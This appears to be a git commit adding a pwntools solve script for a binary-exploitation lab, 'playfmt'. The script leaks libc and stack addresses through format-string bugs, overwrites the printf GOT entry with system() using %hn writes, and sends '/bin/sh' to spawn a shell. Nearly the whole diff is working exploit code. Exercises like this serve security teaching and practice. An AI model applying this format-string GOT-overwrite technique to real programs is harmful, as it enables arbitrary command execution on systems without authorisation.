775c2cd0bb6de78e9ffb32d4c8d0cb08551a8485
0x01f <aboultraman@gmail.com>
2018-07-13 11:41:51 +0800

    add lab 9

--- LAB/lab9/solve.py
+++ LAB/lab9/solve.py
@@ -10,6 +10,7 @@ io = process("./playfmt")
 libc = ELF("/lib/i386-linux-gnu/libc.so.6")
 elf = ELF("./playfmt")
 
+#  gdb.attach(io, "b *do_fmt+64\nc")
 io.send("..%8$p....%6$p..\0")
 io.recvuntil("..")
 libc.address = int(io.recvuntil("..", drop = True), 16) - libc.sym['_IO_2_1_stdout_']
@@ -17,13 +18,32 @@ success("libc.address -> {:#x}".format(libc.address))
 io.recvuntil("..")
 stack = int(io.recvuntil("..", drop = True), 16) - 0x28
 success("stack -> {:#x}".format(stack))
+pause()
 
-io.send("%{}c%6$hhn".format((stack + 0x1c) & 0xff))
+payload = "%{}c%{}$hn".format((stack + 0x1c) & 0xffff, 0x15)
+#  payload += "%{}c%{}$hn".format((stack + 0x2c) & 0xffff - (stack + 0x1c) & 0xffff, 0x16)
+payload += "%{}c%{}$hn".format(0x10, 0x16)
+payload += '\0'
+info(payload)
+io.send(payload)
+pause()
 
-gdb.attach(io, "b *do_fmt+64\nc")
-io.send("%{}c%10$hn\0".format(elf.got['printf'] & 0xffff))
+#  gdb.attach(io, "b *do_fmt+64\nc")
+payload = "%{}c%{}$hn".format(elf.got['printf'] & 0xffff, 0x39)
+#  payload += "%{}c%{}$hn".format((elf.got['printf'] & 0xffff + 2) - (elf.got['printf'] & 0xffff), 0x3b)
+payload += "%{}c%{}$hn".format(2, 0x3b)
+payload += "\0"
+info(payload)
+io.send(payload)
+pause()
 
-io.send("%{}c%7$hn\0".format(libc.sym['system'] & 0xffff))
+#  gdb.attach(io, "b *do_fmt+64\nc")
+payload = "%{}c%{}hhn".format(libc.sym['system'] >> 16 & 0xff, 0xb)
+payload += "%{}c%{}hn".format((libc.sym['system'] & 0xffff) - (libc.sym['system'] & 0xff), 0x7)
+payload += '\0'
+info(payload)
+io.send(payload)
+pause()
 
 io.send("/bin/sh\0")
 
